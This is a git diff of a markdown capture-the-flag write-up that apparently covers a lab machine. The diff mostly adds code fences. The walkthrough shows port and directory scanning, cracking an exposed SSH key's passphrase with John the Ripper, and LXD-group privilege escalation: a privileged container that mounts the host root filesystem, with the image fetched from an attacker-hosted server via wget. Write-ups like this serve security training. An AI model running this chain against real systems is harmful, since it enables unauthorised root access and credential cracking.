@@ -28,6 +28,7 @@ I started with a full TCP port scan to identify open services:
 
 ```bash
 nmap -p- -T4 target_ip
+```
 
 ✅ Findings:
 
@@ -43,7 +44,9 @@ Gobuster Directory Enumeration
 
 I used Gobuster to identify hidden directories:
 
+```bash
 gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
+```
 
 ✅ Result: A hidden /secret directory was discovered.
 
@@ -53,7 +56,9 @@ Source Code Review
 
 While inspecting the website source code, I found a possible username embedded in the page:
 
+```bash
 view-source:http://target_ip
+```
 
 ✅ Username discovered: john
 
@@ -63,26 +68,28 @@ Secret Directory Discovery
 
 Browsing to:
 
+```bash
 http://target_ip/secret
+```
 
 I discovered a private SSH key, but it was encrypted with a passphrase:
 📸 Screenshot:
 ![SSH Key](images/ssh_rsakey.png)
-
-wget http://target_ip/secret/id_rsa
-chmod 600 id_rsa
 
 
 🚪 Initial Access
 Cracking the SSH Key Passphrase
 
 I converted the SSH key into a crackable format:
-
+```bash
 ssh2john id_rsa > hash.txt
+```
 
 Then cracked it with John the Ripper:
 
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 ✅ Passphrase successfully cracked
 
@@ -92,75 +99,76 @@ SSH Access Gained
 
 I logged in using the decrypted private key:
 
+```bash
 ssh -i id_rsa john@target_ip
+```
 
 Inside the system, I obtained the user flag:
 
+```bash
 cat ~/user.txt
+```
 
 ✅ User access obtained
+
 ⬆️ Privilege Escalation
 LXD Group Discovery
 
 I checked my group memberships:
 
-groups
+```bash
+id
+```
 
 ✅ Output showed:
-
-john lxd
+📸 Screenshot:
+![LXD Group](images/lxd.png)
 
 This is a known privilege escalation vector.
 
-📸 Screenshot:
-![LXD Group](images/lxd.png)
 Exploiting LXD via Alpine Builder
 
 I cloned the Alpine image builder on my local machine:
 
+```bash
 git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
 sudo ./build-alpine
-
+```
 I then hosted the image using Python:
 
-python3 -m http.server 80
+```bash
+python3 -m http.server
+```
 
 On the victim machine, I downloaded it:
 
+```bash
 wget http://attacker_ip/alpine-v3.18-x86_64.tar.gz
+```
 
-Imported the image into LXD:
+Imported the image into LXD and starting exploiting:
 
+```bash
 lxc image import alpine-*.tar.gz --alias alpine
-
-Initialized a privileged container:
 
 lxc init alpine privesc -c security.privileged=true
 
-Mounted the host root filesystem:
-
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
-
-Started the container:
 
 lxc start privesc
 lxc exec privesc /bin/sh
 
-Accessed the host root filesystem:
-
 cd /mnt/root
 
-👑 Root Access
-
-I accessed the root user directly from the mounted filesystem:
-
 cat /mnt/root/root/root.txt
+```
 
 ✅ ROOT ACCESS SUCCESSFULLY ACHIEVED
 
 📸 Screenshot:
 https://PASTE_IMAGE_LINK_HERE/lxd_exploit.png
+
 ✅ Summary
 Phase	Result
 Nmap Scan	Found SSH & HTTP
